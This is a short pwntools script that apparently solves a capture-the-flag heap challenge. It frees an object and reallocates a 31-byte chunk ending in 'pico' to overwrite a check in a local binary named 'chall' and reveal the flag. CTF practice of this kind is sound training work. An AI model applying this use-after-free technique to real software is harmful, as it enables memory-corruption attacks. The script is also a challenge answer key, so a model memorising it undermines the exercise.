from pwn import *

elf = context.binary = ELF("./chall")

def my_process():
    return process("./chall")

p = my_process()

def print_heap():
    log.info(p.recvuntil(b"choice: "))
    p.sendline(b"1")

def allocate_obj(size, payload):
    log.info(p.recvuntil(b"choice: "))
    p.sendline(b"2")
    log.info(p.recvuntil(b"allocation: "))
    p.sendline(size)
    log.info(p.recvuntil(b"flag: "))
    p.sendline(payload)

def print_flag():
    log.info(p.recvuntil(b"choice: "))
    p.sendline(b"3")

def check_win():
    log.info(p.recvuntil(b"choice: "))
    p.sendline(b"4")
    line = p.recvline()
    log.info(line)
    if line.startswith(b"YOU"):
        log.info(p.recvall())

def free():
    log.info(p.recvuntil(b"choice: "))
    p.sendline(b"5")

def complete():
    p.sendline(b"6")
    log.info(p.recvall())


print_heap()
free()
allocate_obj(b"31", b"A" * 30 + b"pico")
print_flag()
check_win()
